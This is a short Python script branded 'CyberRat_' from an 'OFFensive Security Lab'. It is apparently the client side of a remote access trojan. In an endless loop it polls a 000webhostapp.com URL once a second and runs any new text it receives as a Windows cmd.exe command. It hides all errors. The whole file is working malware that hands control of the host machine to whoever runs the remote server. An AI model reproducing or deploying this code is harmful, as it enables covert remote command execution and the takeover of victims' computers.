import subprocess
import requests
import time
import os
import sys

art = """

   █████████             █████                        ███████████              █████                             ███
  ███░░░░░███           ░░███                        ░░███░░░░░███            ░░███                            ███░ 
 ███     ░░░  █████ ████ ░███████   ██████  ████████  ░███    ░███   ██████   ███████                        ███░   
░███         ░░███ ░███  ░███░░███ ███░░███░░███░░███ ░██████████   ░░░░░███ ░░░███░                       ███░     
░███          ░███ ░███  ░███ ░███░███████  ░███ ░░░  ░███░░░░░███   ███████   ░███                      ███░       
░░███     ███ ░███ ░███  ░███ ░███░███░░░   ░███      ░███    ░███  ███░░███   ░███ ███                ███░         
 ░░█████████  ░░███████  ████████ ░░██████  █████     █████   █████░░████████  ░░█████  █████████ ██ ███░           
  ░░░░░░░░░    ░░░░░███ ░░░░░░░░   ░░░░░░  ░░░░░     ░░░░░   ░░░░░  ░░░░░░░░    ░░░░░  ░░░░░░░░░ ░░ ░░░             
               ███ ░███   -----------------------------------------------------------------------------                                                                                          
              ░░██████       Developed In OFFensive Security Lab                                                                                       
               ░░░░░░                                        By Nuhu Tahiru                                                       
                          -----------------------------------------------------------------------------   
               
"""
print(art)

def execute_command(command):
    subprocess.run(["cmd.exe", "/C", command], input='', text=True)

def main():
    old_json = "as"
    chk = 0

    while chk == 0:
        try:
            json_data = download_json("https://monopteral-respirat.000webhostapp.com/get.php")

            if json_data != old_json:
                print(f"diff result json={json_data} old={old_json}")
                # Change the directory to the desired location before executing the command
                #os.chdir("C:\\Users\\Don't Sleep\\Desktop")
                execute_command(json_data)
            else:
                print(f"same result json={json_data} old={old_json}")

            old_json = json_data

        except Exception as e:
            pass

        time.sleep(1)

def download_json(url):
    response = requests.get(url)
    response.raise_for_status()
    return response.text

if __name__ == "__main__":
    main()
